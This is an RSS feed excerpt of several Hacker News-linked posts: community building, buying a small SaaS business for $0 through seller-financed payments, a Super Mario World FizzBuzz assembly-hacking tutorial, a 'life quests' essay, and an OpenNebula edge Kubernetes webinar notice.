    </ul>
  </li>
</ul>



<ul>
  <li>On speaking at conferences:
    <ul>
      <li><strong>Other companies:</strong> It’s not uncommon to have Developer Advocates whose role it is to speak at conferences.</li>
      <li><strong>My take:</strong> In comparison, I prefer to work with our community members so that they give the best conference talks possible (note: I have spoken at the odd-conference here and there – it’s a great way for to make sure that I’m well placed to give community members advice on how to make talks great!).</li>
    </ul>
  </li>
</ul>



<ul>
  <li>On getting product feedback:
    <ul>
      <li><strong>Other companies:</strong> If I had an Amazon gift card for every time a company sent me an email asking me to do a product survey (in exchange for… an Amazon gift card). Some times, it’s up to the community team to bring feedback back to the company.</li>
      <li><strong>My take:</strong> I think more about how I can bring our team <em>into</em> the community — I’m very lucky in that all of our product team are data people themselves, so have a shared context with our community. But even our non-data teammates are building connections in the community — everyone on our team is great at what they do, and our community members often enjoy getting the chance to speak to a fantastic product designer and learn from them.</li>
    </ul>
  </li>
</ul>



<ul>
  <li>On recognizing community members:
    <ul>
      <li><strong>Other companies:</strong> Ever been to a conference that had a points system for swag? Or seen a community that had a leaderboard? In these cases a company is trying to incentivize someone to give them something.</li>
      <li><strong>My take:</strong> If someone does something wonderfully kind, I’ll try to say thanks with a small gift. As much as possible, I’m trying to recognize, rather than incentivize.</li>
    </ul>
  </li>
</ul>



<p>I think part of this is also just treating our community members with respect. Our community is full of incredibly bright, curious, and kind human beings&nbsp;— they’d see right through us if our motivations were related to dollars.</p>

<p>The <em>incredible</em> thing about this approach is that we do end up getting all of those benefits that I listed above — yes, we have a great sales funnel; yes, we have huge reach; yes, we stay in touch with our user needs; yes, we have people contribute work that we could not do ourselves. But we only get to sustain the good vibes (even with our growth) because we stay true to our mission.</p>


<p>That’s okay! But I think you need to be realistic with what you’re going to achieve if you try to build a community. Maybe your team isn’t going to build <em>the</em> <code>&lt;insert field of practice&gt;</code> community, but perhaps there’s ways you can generate goodwill by contributing to adjacent communities.</p>

<p>A lot of this mindset also applies to other interactions with your users, crossing over into the world of “developer experience” (i.e. how easy it is for a developer to be successful with your product) — by putting your user first, you’ll still create a lot of virtuous cycles.</p>

<p>No matter what your mission is, I encourage you to ask not what your community can do for you, but what you can do for your community.</p>



<p>We’ll see, this is my first time writing about community, and I have no idea how it will land.</p>

<p>Here’s a few topics I’m thinking about:</p>
<ul>
  <li>Managing the growth of a community</li>
  <li>Measuring the success of community</li>
  <li>Assessing community-market fit (or: when community isn’t the right strategy)</li>
  <li>What to look for in an early hire</li>
</ul>

<p>If one of these appeals to you, let me know via <a href="https://twitter.com/clairebcarroll/status/1365679922585468931">the bird site</a> or <a href="mailto:hello@clrcrl.com">email</a>.</p>

<hr>

<p>¹If you are reading this, and you have sent an email to someone in the past asking to “pick their brain” via a 30 minute meeting with no agenda, please don’t do this. Instead, send an email that includes the specific questions you are interested in, and don’t assume that the best way to get them answered is via a call.</p>

        </div></div>]]>
            </description>
            <link>https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26363709</guid>
            <pubDate>Fri, 05 Mar 2021 23:39:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buying a Business for $0 and growing it]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26363301">thread link</a>) | @catchmeifyoucan
<br/>
March 5, 2021 | https://every.to/superorganizers/how-i-bought-a-business-for-0 | <a href="https://web.archive.org/web/*/https://every.to/superorganizers/how-i-bought-a-business-for-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><em>Hiâ€”Dan here. We're continuing Justin Mares's column on side businesses today! You can read previous editions </em><a href="https://every.to/@jwmares" rel="noopener noreferrer" target="_blank"><em>here</em></a><em>.</em></p><p>Before starting <a href="http://kettleandfire.com/" rel="noopener noreferrer" target="_blank">Kettle &amp; Fire</a>, I had a previous life in the SaaS world. I ran growth for a team (Exceptional Cloud Services)&nbsp; that bought small SaaS apps and grew them. We later sold the bundle of businesses to Rackspace for 8 figures, in early 2013.&nbsp;</p><p>When I left Rackspace after the acquisition and went out on my own, I wanted to replicate the model weâ€™d seen so much success with at Exceptional. I wanted to buy and grow my own SaaS business.&nbsp;</p><p>My partner Ryan and I were on the lookout for a business that fulfilled one of the <a href="https://every.to/superorganizers/the-four-kinds-of-side-hustles-2083436" rel="noopener noreferrer" target="_blank">side hustle criteria</a> Iâ€™ve written about before. A strong potential acquisition had to:</p><ul><li>Solve a problem someone is already aware of,</li><li>In a niche where customers are already paying,</li><li>Where the product <em>does not</em> require a lot of maintenance or hand-holding,</li><li>And is profitable or has a no-brainer path to profitability</li></ul><p>In early 2016, we stumbled across Notify: a simple Shopify plugin that would pop up at the bottom of a website, displaying a purchase another customer had recently made.</p><p><img src="https://lh5.googleusercontent.com/snCfaj5_C-1syTXy4LkPpzKMFBlQ52St0OM2P3E_zqzUVp9_Wt58QG4D2o6G3nuXYiamO1LNNi1b_cicP1781j0-BxSHMr0-XxKpoP7qY0ADq-Vq_xrId6tVHnM6keJxQ87B5CSD"></p><p>Once I saw it in action, I immediately installed it on <a href="https://www.kettleandfire.com/" rel="noopener noreferrer" target="_blank">Kettle &amp; Fire</a> and saw a 40% lift in conversionâ€¦ and $1,400 in extra sales (this was 2016â€¦ K&amp;F was a lot smaller then ðŸ™ƒ).</p><p><img src="https://lh5.googleusercontent.com/XaXoTmu3NxGZOEawmBfaPUhytLba2rid3i3Wf6PfomzNiAukmhLSZl-Mu3RFSjQtwZRFE8hle4yE2Ty1y5jHEkCJPv7VfoPxsaQ0cNbkiTu84Vw5JCHa4rF-JYCLi9f5haDumRSe"></p><p>Woah.&nbsp;</p><p>If it helped my site this much, how many others see a similar sales lift? We had a strong hunch that we could buy Notify, add a few features, put some marketing behind it and grow it quite a bit.&nbsp;</p><p>On February 1, we fired off this email:</p><p><img src="https://lh6.googleusercontent.com/HEMvbe7q_x7pz90iv_OjztnMmZgiPL4Pw_QjIlFmh84HsiEX8XA6Q7UuNKALqkx_mmBMZNaufWI_SjIj2JI1Qa8B09dw63vBWYFTiek2YFbd5uZM8-ACoIlpDIq7awjpG6jOm3p4"></p><p>Buying an app, no matter how small, is a lot of work. Iâ€™d tried to purchase other software businesses in the past and understood how hard it was to come to an agreement. The process involves a good bit of legal spend and can fall apart at the drop of a hat: lessons learned after spending $10k on legal for a failed acquisition 12 months prior ðŸ¤¦.&nbsp;</p><p>We first wanted to see how serious Notifyâ€™s owner, Scott, was about selling. We emailed him and grabbed dinner just one week after our first email exchange.</p><p>During dinner, Ryan and I expressed our admiration for what Scott had accomplishedâ€”which was truly impressive. We covered our backgrounds, and shared the many ideas we had for the product that could take it to the next level.&nbsp;</p><p>Dinner went swimmingly and we learned a LOT about the product. Within a day or two, we followed up with super early diligence questions:</p><p><img src="https://lh5.googleusercontent.com/oQNRoVWMgHJ3bEzzDTXffQnVO1ipHtGFyUQkSqBy-M56RTL8wJ1ZL_xE-Aq9caFXoz5FtlQ4Aoa_ON-04u3Su5s4y1A2zT5vIFCznVUFurYclJy1whYDgqmHXXvSyJ2AzJexRqbS"></p><p>After taking four days to review the numbers he sent over, we responded with a Letter of Intent: a legal but non-binding letter showing we were serious about buying the business. An LOI also serves to ensure that both parties are aligned on high-level terms: what weâ€™d pay, when those payments would hit, etc.&nbsp;</p><h2>Actually buying the business</h2><p>Letâ€™s pause here for a second to address some common misconceptions.&nbsp;</p><p>First, it may feel like youâ€™re listening to Uncle Warren Buffett espousing the benefits and strong returns that come from buying a railroad. <em>Thanks Warren, but how the hell does this apply to me?&nbsp;</em></p><p>The truth is, you donâ€™t need a lot (or any) money to buy many of these small businesses. Many small businesses you can actually buy for $0 up front, if you negotiate it properly and find a motivated seller. Where revenue is less than $20K per month, many of the businesses youâ€™re looking at arenâ€™t businesses at all: theyâ€™re jobs. And if you find an owner (like we did) who wants to quit his job, you can make a deal happen. Youâ€™ll get what you want (a revenue-generating business), the seller gets what he wants (his time back and money for his efforts), and everybody wins.&nbsp;</p><p>While negotiating this acquisition, I kept in mind something one of my mentors shared when buying assets. Assuming youâ€™re not in crazy hot competition for something, it often pays to approach deals in a certain way: â€œ<strong>my price, your terms OR your price, my terms.</strong>â€�&nbsp;</p><p>Letâ€™s say we wanted to buy an app for $1M, and wanted to pay for it over 1-2 years with monthly cash payments. Our lovely seller wants to sell for $1.5M.&nbsp;</p><p>In a scenario like this, weâ€™d put in an offer of $1M cash, up-front (his terms, our price) and see if that gets it done. Alternatively, if the seller was firm on price but didnâ€™t care as much about cash right now, weâ€™d offer $1.5M paid out over 1-2 years in monthly cash payments. His price, our terms.&nbsp;</p><p>In this case, we ended up going with the other option for the Notify deal: the price the owner wanted for the company, on our terms.</p><p>Scott, Notifyâ€™s owner, wanted a high (but fair) price, and wanted to have a piece of the upside going forward. We landed on a structure that would reach his goals <em>and</em> allow us to buy the business for literally $0.&nbsp;</p><p>Hereâ€™s how (<em>note: numbers are not actuals</em>):</p><ol><li>We agreed on an overall value of the business: call it $500K.&nbsp;</li><li>We then discussed how much ownership Scott wanted to maintain in the entity going forward. Letâ€™s say we landed at 20%: we then subtracted that ownership from the total purchase price, and had to figure out how to come up with $400K to buy 80% of the business.&nbsp;</li><li>As I said earlier: he chose the price, we chose the terms. Our terms were that weâ€™d buy the business via a series of monthly payments over the next 20 months. So, in our example $400K required purchase amount, weâ€™d pay $20K/mo to buy the business.&nbsp;</li><li>Hereâ€™s the kicker: we structured the deal so that payments would begin 60 days after close. Because the business was already doing more than our monthly payments to the seller, as long as the business didnâ€™t implode (it didnâ€™t ðŸ˜…), <strong>weâ€™d be able to buy the business with its own revenue</strong>. $0 out of our own pockets.&nbsp;</li></ol><p>Once the price and terms were baked into the LOI (and the seller signed), we moved into deeper diligence. Just 23 days after our first email to Scott ðŸ�Žï¸�!&nbsp;</p><p>We asked him to complete a questionnaire about Notifyâ€™s growth, revenue, tools used, etc., as well as give us all the logins related to the business. Over the next two weeks, as we dug into the info he sent us, we worked with a lawyer to pull together an Asset Purchase Agreement (APA)â€”the document that would make the sale official.</p><p>Fast forward to closing day: March 10, 2016. We received a signed APA, and became owners of a business that was generating cash!</p><p>Several years later, Notify has become <a href="http://fomo.com/" rel="noopener noreferrer" target="_blank">Fomo</a>: a software business that does $1M+ each year.&nbsp;</p><p>Though buying a small SaaS business is more competitive now, there are still a ton of opportunities to buy small assets and scale them on the side. If I were to run this strategy again, Iâ€™d focus on a few areas:</p><ol><li>Buying land and putting it on Hipcamp and other camping rental sites (as I discussed in <a href="https://justinmares.substack.com/p/the-next-brand-episode-13" rel="noopener noreferrer" target="_blank">my last newsletter</a>, please God someone reach out to me and help me do this).&nbsp;</li><li>Buying up small apps in the Google Chrome or Mac app store.</li><li>Buying assets on rapidly growing platforms. Could you buy out a Fortnite skins developer? A creator on Roblox? A top theme developer on Webflow or Shopify? A tool on Figma?&nbsp;</li><li>Buying small software businesses in industries tech doesnâ€™t traditionally touch. In my world of CPG (consumer packaged goods) and food, there are a <em>ton</em><strong> </strong>of small software opportunities where a strong operator could buy an asset, tune it up, and do quite well.&nbsp;</li></ol><p>Happy hunting!&nbsp;</p><p><em>Note â€“ this post originally appeared on Justin's newsletter&nbsp;</em><a href="https://justinmares.substack.com/" rel="noopener noreferrer" target="_blank"><em>The Next Brand</em></a><em>.</em></p>
      </div></div>]]>
            </description>
            <link>https://every.to/superorganizers/how-i-bought-a-business-for-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26363301</guid>
            <pubDate>Fri, 05 Mar 2021 22:55:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FizzBuzz Mario World: Learning Assembly Language and Having Some Fun]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26362739">thread link</a>) | @vga805
<br/>
March 5, 2021 | https://computebeauty.com/posts/fbmw/index.html | <a href="https://web.archive.org/web/*/https://computebeauty.com/posts/fbmw/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I've wanted to learn <a href="https://en.wikipedia.org/wiki/Assembly_language" target="_blank">Assembly language (ASM)</a> programming for a long time. I finally found the perfect project to do it: hacking Super Mario World (SMW). It was a lot of fun so I thought I'd document the process.</p><p>The SMW <a href="https://en.wikipedia.org/wiki/ROM_hacking" target="_blank">ROM hacking</a> community is vibrant. It's an impressively talented and creative community that makes a lot of awesome games with custom graphics, music, level design, and game physics. Stumbling upon <a href="https://www.youtube.com/results?search_query=super+mario+world+rom+hack" target="_blank">these hacks</a> on YouTube started me down this rabbit hole.</p><p>TLDR: the code and a list of the resources mentioned in this post can be found on <a href="https://github.com/thoughtbyte/super-fizzbuzz-world" target="_blank">GitHub</a>.</p><h2>FizzBuzz Mario</h2><p><a href="https://en.wikipedia.org/wiki/Fizz_buzz" target="_blank">FizzBuzz</a> is a common problem that beginner programmers solve for practice. The objective is to loop from 1 to 100 and:</p><ul><li>for every number divisible by 3, print 'fizz'</li><li>for every number divisible by 5, print 'buzz'</li><li>for every number divisible by 3 and 5, print 'fizz buzz'</li><li>otherwise print the number</li></ul><p>The goal of this project is to solve a problem similar to FizzBuzz by writing custom ASM that can be patched, or inserted, into the SMW code. The perfect context for FizzBuzz in SMW is the coin count. At any one time the player can have between 0 and 99 coins. Additionally, Mario can have 1 of 4 power-up statuses: small, big, cape, and fire. Here's the behavior we'll hack into our version of SMW:</p><ul><li>when coin count is divisible by 3, set status to big</li><li>when coin count is divisible by 5, set status to cape</li><li>when coin count is divisible by 3 and 5, set status to fire</li><li>otherwise set status to small</li></ul><p>Here's game-play of the finished product:</p><p><iframe title="FizzBuzz Mario World Demo" src="https://www.youtube.com/embed/APwAE0wiGF8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><h2>Getting Started</h2><p>After a few minutes of searching the web I found the source of most of the information I'll be sharing: <a href="https://www.smwcentral.net/" target="_blank">SWM Central</a>. You can find a full list of resources at the end of this article but the guides I found most helpful were Ersanio's <a href="https://ersanio.gitbook.io/assembly-for-the-snes/" target="_blank">Assembly for the SNES</a> and <a href="https://www.smwcentral.net/?p=section&amp;a=details&amp;id=15073" target="_black">Assembly for Super Mario World</a>. The former assumes no knowledge of ASM. The latter refreshes the ASM information from the former and then goes into how to apply a simple patch similar to the one we'll be writing. Both are quick reads and I recommend them to any programmer that wants to know what ASM programming feels like.</p><h3>Memory</h3><p>ASM is a low-level language with which you deal directly with individual bytes of memory. SNES games are comprised of read-only memory (ROM) and random-access memory (RAM). You can think of the ROM as the game cartridge itself. Instead of an actual cartridge and SNES, the ROM for present purposes is a computer file that you can play on a <a href="http://www.snes9x.com/" target="_blank">SNES emulator</a>. The ROM is where all the code for how the game works is stored. This memory, as the name implies, is usually only ever read from. Our goal is to hack this ROM by overwriting a small part of it thus changing how the game behaves.</p><p>The RAM is on the SNES itself and it's where values are stored that will change while the game is played. The coin counter value needs to live in RAM because it changes often. The same goes for the player's power-up status.</p><p>In both ROM and RAM, memory is a long list of addresses where values can be stored. These addresses are represented in <a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank">hexadecimal (hex)</a>. For our purposes we'll need to figure out the memory addresses for three things: the value of the coin count, the value of the power-up status, and where to insert some custom code.</p><p>Fortunately, people have completely disassembled SMW and mapped the RAM and ROM, so finding what we need is a simple web search. The RAM map can be found on <a href="https://www.smwcentral.net/?p=memorymap&amp;game=smw&amp;u=0&amp;address=&amp;sizeOperation=%3D&amp;sizeValue=&amp;region[]=ram&amp;type=*&amp;description=" target="_blank">SMW Central</a>. The RAM begins at address <code>$7E0000</code> and ends at <code>$7FC800</code>. The <code>$</code> indicates hex. By searching a few relevant keywords I found that the coin count is stored at address <code>$7E0019</code> and the power-up status is stored at address <code>$7E0DBF</code>. The entry for power-up status also indicates the 4 possible values for this address and what they mean: 1 for big Mario, 2 for cape Mario, 3 for fire Mario, and 0 for small Mario.</p><p>This gives us a basic idea of what our ASM code will need to do, in pseudocode:</p><pre><code>every time the coin count increases:
  get the value of RAM address $7E0019 (coin count)
  if that value is divisible by 15
    store 3 in RAM address $7E0DBF (power-up status)
  else if that value is divisible by 5
    store 2 in RAM address $7E0DBF
  else if that value is divisible by 3
    store 1 in RAM address $7E0DBF
  else store 0 in RAM address $7E0DBF</code></pre><p>Now we need to figure out where to insert our code. I want this code to run whenever the player gets a coin so I searched for "coin count" within the ROM map and found <code>$008F1D</code>, a 30 byte piece of code that "handles actually increasing the player's coin count and giving a life from 100 coins." This is a good start, but we can't just insert code into 30 bytes of ROM without seeing what it does. We will break everything if we're not careful. Unfortunately the ROM map on SWM Central doesn't have the actual code stored at this address. But then I found <a href="https://www.smwcentral.net/?p=section&amp;a=details&amp;id=21822" target="_blank">All.log++</a>: a complete disassembly of the SMW source code, in ASM, with extensive comments and labels.</p><p>Inspecting the disassembled SMW source code at this coin count code address, I noticed that the address where the coin count is actually increased is <code>$008F25</code>. That is, this is the memory address of ROM that stores the instruction that literally adds 1 to the coin count every single time the player receives 1 coin. But instead of just increasing the coin count by 1, I want to patch the ROM so that when the code at this address gets executed, the SNES <i>also</i> runs my FizzBuzz code.</p><p>Now we have all of the relevant memory addresses that we need, and we have the pseudocode that we need to run at the coin count increase ROM address. Now we assemble.</p><h2>Writing the Code</h2><p>Our first two lines are easy:</p><pre><code>!PowerUpStatus = $0019
!CoinCount = $0DBF</code></pre><p>We simply set the RAM memory addresses that we need for the coin count and power-up status to some labels so they'll be easier to refer to in the code. Notice that we dropped the <code>7E</code> from both addresses. We don't need it. These lines don't actually get patched into the ROM. All occurrences of the labels in the code that we will write will get replaced with the addresses by the assembler. The assembler is the thing that will take our code and insert it into the ROM.</p><h3>Hijacking the Coin Count Increase Code</h3><p>We know where we want to insert our code: the ROM address where the coin count is increased. But we can't insert <i>all</i> of our code into this address, we'll overwrite a lot of stuff and break the game. We can only insert a few bytes, and we have to make sure the bytes that we overwrite are executed by us in our own code so that everything that the original code was supposed to do still happens. So what we'll do is insert one instruction in the ROM at the coin count increase address that tells the processor to <i>jump</i> to the rest of our code. Then we'll tell the assembler to insert our code in some free space so we don't overwrite anything. Here's what that looks like:</p><pre><code>ORG $008F25
JSL FizzBuzz
NOP
NOP

freecode</code></pre><p><code>ORG $008F25</code> instructs the assembler to insert the following instruction, <code>JSL FizzBuzz</code>, into the ROM address where the coin count is increased. What <code>JSL FizzBuzz</code> means is: <b>J</b>ump to the <b>S</b>ubroutine code labeled <code>FizzBuzz</code>. Most ASM operation codes, or opcodes, are menumonic. The J and S are for Jump and Subroutine. We can ignore the L, it's beyond the scope of this.</p><p>What's with the <code>NOP</code>s? As it turns out, the code we've chosen to overwrite, the coin count increase instruction, is 3 bytes long (we know this because All.log++ tells us that). The code we insert, <code>JSL FizzBuzz</code>, is 4 bytes long. So in our attempt to overwrite 1 3 byte long instruction, we overwrote the first byte of a second instruction.</p><p>The fix for this is that we need remember to execute <i>both instructions that we overwrote</i> in the code <i>we</i> write. The second instruction we overwrite, like the first, is 3 bytes long, for a total of 6 bytes. But again, the code we inserted is only 4 bytes: there are still 2 dangling bytes that were previously part of that second instruction. That's not good. Random, partially overwritten bytes in the code will break the game. So, we include 2 <code>NOP</code> instructions. These are <b>N</b>o <b>OP</b>erations. We do nothing for 2 bytes to fill up the space not filled up by the previous 4 bytes of code we inserted. To recap, we overwrote 6 bytes of 2 instructions with 6 bytes of our own instruction that jumps to our custom code.</p><p><code>freecode</code> just means find some free space in the ROM to put the rest of our custom ASM code.</p><h3>The FizzBuzz Subroutine</h3><p>The following code is the beginning of the <code>FizzBuzz</code> subroutine that we referenced above.</p><pre><code>FizzBuzz:
INC !CoinCount
LDA #$0F
STA $00
LDA !CoinCount
JSR Mod</code></pre><p>The first line is the label. The second, <code>INC !CoinCount</code>, means <b>INC</b>rement the value in the memory address for the coin count by 1. This is what the first instruction of the code we overwrote was supposed to do, so we do it here ourselves.</p><p>In ASM, one of the most important things is the <a href="https://en.wikipedia.org/wiki/Accumulator_(computing)" target="_blank">accumulator</a>. Essentially, the accumulator (A) is the memory address where the microprocessor stores its results from math and logic operations. We can also store stuff there for use in math operations. <code>LDA #$0F</code> does just that. It <b>L</b>oa<b>D</b>s into the <b>A</b>ccumulator the value 15. 0F is hex for the decimal value 15, and the # means we want the value 15 itself, not what's stored at the memory address 15.</p><p>We then run <code>STA $00</code>, this <b>ST</b>ores the value of the <b>A</b>ccumulator into memory address <code>$00</code>. This memory address is "scratch" memory that has no assigned purpose other than as a place to store temporary values. We couldn't just store a value directly into <code>$00</code>, instead it was a two-step process: load a value into A, then store the value of A in <code>$00</code>. Next, <code>LDA !CoinCount</code> loads the value of the coin count into A.</p><p>So now we have two values stored in memory: the coin count, stored in A, and 15, stored in <code>$00</code>. To check if something is divisible by 3 and 5, we can divide it by 15 and check if there's a remainder. Many programming languages have a modulo operator that gives you the remainder of 1 number divided by another. For example, 47 modulo 15 is 2. <code>JSR Mod</code> means <b>J</b>ump to the <b>S</b>ub<b>R</b>outine labeled <code>Mod</code>.…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://computebeauty.com/posts/fbmw/index.html">https://computebeauty.com/posts/fbmw/index.html</a></em></p>]]>
            </description>
            <link>https://computebeauty.com/posts/fbmw/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26362739</guid>
            <pubDate>Fri, 05 Mar 2021 22:04:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Life Quests, Not Goals]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361941">thread link</a>) | @rasen58
<br/>
March 5, 2021 | https://himat.github.io/posts/life_quests_not_goals/ | <a href="https://web.archive.org/web/*/https://himat.github.io/posts/life_quests_not_goals/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

      <p>Some people say they have goals that they want to accomplish in life.</p>
<p>I, however, have goals and quests.</p>
<p>I'll explain what quests are, but I would recommend reevaluating your goals and considering turning some of them into quests. If you adopt this framing of quests and goals, then you might be able to better approach some of the things you want to do in life.</p>
<p>This quests and goals mindset is something I thought of in the past few years just because it seemed natural for me to think of things in this way.</p>
<h2 id="what-are-quests">What are quests?</h2>
<p>In many games, you are often given a multitude of quests (like slay 100 trolls, find a chicken in the castle, etc.), and if you complete a quest, you will receive some kind of reward.
These are not goals. For it to be a goal, it would mean that you need to achieve it or else you have lost the game or can't progress forward.</p>
<p>For a quest though, there's no pressure to complete it. You'll have a multitude of quests available to you, and you can freely choose to embark upon the quests that interest you at this time. If you complete a quest, then that's fantastic, and you'll get some kind of reward. If you fail, then sure you may be a bit sad, but perhaps you can try again, and regardless, it was hopefully a fun or educational experience in trying to complete the quest.</p>
<p>In the same way that quests exist in games, you can also set quests for yourself in the game of life. When you set quests for yourself, you're telling yourself that these would be cool things that I would like to do, but if I don't do them or I fail at them, it's not too big of a deal. I'll feel pretty awesome if I do complete a life quest, but I won't feel that bad if I don't.</p>
<p>A life goal on the other hand, would be a task that you think is a critical milestone for who you are in life and what you want to do. You may want to change your goals at some point, or it may not be too terrible if you fail to achieve a goal, but a goal is still probably something important to you. We'll talk more about goals in the next section.</p>
<p>To give you some examples, some of my quests include: being able to draw and sing well. I ideally want to do these things, and they would be very fun to do, but I probably won't direct all my energy towards them.</p>
<h2 id="you-should-still-set-goals">You should still set goals</h2>
<p>I think that more people should think in terms of this quests vs goals mindset.</p>
<p>But, you should still have goals too. It's just that people only have goals right now, whereas some of those “goals” could be quests instead.</p>
<p>For example, a real goal I have is to create something that creates immense value in the world (i.e. some kind of product/service/etc that helps the world). This may happen by me starting a company to do this.</p>
<p>If I don't achieve this, then I actually will feel that I have failed. This is fine by me since this matters to me a lot (of course I'm not going to mope about failing, but I will have to acknowledge that I didn't accomplish this goal at some point if it doesn't work out.) We may not achieve all our goals, but we can have fun trying.</p>
<p>Another one of my goals for my life is to help more people increase and achieve their potentials since I feel that so much more can be created in the world, but that most people are lacking the motivation, guidance, or resources to do more. I’m always trying to do this, so this goal won’t ever be officially completed - it’s an ongoing goal of mine.</p>
<h2 id="side-quests">Side quests</h2>
<p>Not all of your quests will be of the same importance. You might have some big quests in your life that you think would be really great if you accomplished, and there will be other smaller mini / side quests that might just be fun to do, but that you won't often think about.</p>
<p>Some of my side quests include: organizing a random multi-day physically exhausting trip somewhere with two people I don't know that well, and trying to be a long-haul truck driver for a bit.</p>
<p>You might similarly categorize your goals too as small or big goals.</p>
<h2 id="only-quests">Only quests?</h2>
<p>Some people advocate for not setting goals at all and to instead just focus on the process instead of the end result. If you follow that mentality you might consider only setting quests for yourself.</p>
<p>I think that if there's something you really care about though, then you will want to set goals.</p>
<h2 id="why-have-quests">Why have quests?</h2>
<p>The problem I see currently is that some people have way too many goals, which causes them to be confused about which direction to go in, or people have no goals because they think calling something a goal is too serious and they're worried about failing if they say they have a goal.</p>
<p>So if you have way too many goals right now, then I think reconsidering them and figuring out which are the ones really important to you (goals) and which are the ones that would just be cool to do (quests) would help give you better direction. This way, you can now try to go in the direction of your few goals, while maybe doing some quests along the way.</p>
<p>And if you have no goals right now because you are scared of proclaiming this goal loudly and failing, then consider making it a quest. It's totally fine to loudly shout that you have a quest to do something because even if you fail, that's fine!</p>
<p>If you have no goals right now solely because you don't have anything worthy of being a goal, that's fine too! Not everyone needs to have a goal. So instead, just enjoy your time going on fun quests, and who knows, maybe along the way, you'll realize that there is something worthy of becoming a goal :).</p>
<p>Think of your next quest right now before you forget.</p>

      <hr>
      <div>
  <p>
    Receive email notifications for new posts (I might publish a post once every
    few months)
  </p>
  
  
  
</div>

    </div></div>]]>
            </description>
            <link>https://himat.github.io/posts/life_quests_not_goals/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361941</guid>
            <pubDate>Fri, 05 Mar 2021 20:52:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CNCF Webinar on Deploying Kubernetes at the Edge with OpenNebula]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361258">thread link</a>) | @amarti
<br/>
March 5, 2021 | https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/ | <a href="https://web.archive.org/web/*/https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
				
				
<p>Back in November 2020, we <a href="https://opennebula.io/opennebula-joins-cncf/">announced</a> that OpenNebula had joined the&nbsp;<strong>Cloud Native Computing Foundation</strong>&nbsp;(CNCF) as a Silver Member 🤓 A couple of weeks later, we launched our CNCF-certified <a href="https://opennebula.io/certified-kubernetes-appliance/">Kubernetes Appliance</a>. And next week we’ll be contributing to the new <strong>CNCF On-Demand Webinar</strong> series with an amazing demo showcasing how to use OpenNebula’s <a href="https://opennebula.io/edge-cloud/">new Edge Computing features</a> to deploy <strong>Kubernetes clusters at the Edge</strong>, in this case for multiplayer gaming! 🎮</p>



<p>Edge computing is becoming increasingly popular thanks to the growing availability of cloud and bare-metal providers like <strong>AWS</strong> and <strong>Equinix Metal</strong> offering flexible and affordable access to edge resources around the globe. Now, thanks to our <a aria-label="ONEedge (opens in a new tab)" href="https://oneedge.io/" target="_blank" rel="noreferrer noopener">ONEedge</a> initiative, we’ve transformed OpenNebula into a powerful, <strong>open source Edge Computing platform</strong>! 🌎 The idea is to offer an easy way for organizations with an on-premises or hosted OpenNebula cloud to quickly leverage edge resources in locations that are closer to their end-users or IoT devices, <strong>improving network latency and user experience</strong>, reducing security risks, and minimizing data transfers to central cloud locations.</p>



<p>In this <a aria-label="CNCF on-demand webinar (opens in a new tab)" href="https://community.cncf.io/events/details/cncf-cncf-online-programs-presents-cncf-on-demand-webinar-deploying-k3s-at-the-edge-for-multiplayer-gaming/" target="_blank" rel="noreferrer noopener">CNCF On-Demand Webinar</a> (available from Thursday, <strong>March 11 </strong>onwards) we’ll show how to easily provision edge resources with the new <a href="https://opennebula.io/opennebula-6-0-mutara-beta-is-out/">OpenNebula 6.0 “Mutara”</a>, and how to deploy <strong>K3s clusters at the Edge</strong> for multiplayer gaming, using <a href="https://opennebula.io/firecracker/">Firecracker</a> and Agones. We’ll combine all these open source technologies to deploy at the edge a dedicated infrastructure for Xonotic, the well-known open source FPS multiplayer game. Let the fun begin! 🚀</p>







<div><figure><a href="https://community.cncf.io/events/details/cncf-cncf-online-programs-presents-cncf-on-demand-webinar-deploying-k3s-at-the-edge-for-multiplayer-gaming/" target="_blank" rel="noopener"><img width="750" height="422" src="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg" alt="CNCF webinar cover" srcset="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg 750w, https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover-480x270.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 750px, 100vw" title="CNCF Webinar - K3s at the Edge for Multiplayer Gaming 1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20750%20422'%3E%3C/svg%3E" data-lazy-srcset="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg 750w, https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover-480x270.jpg 480w" data-lazy-src="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg"></a></figure></div>















<div>
<div>
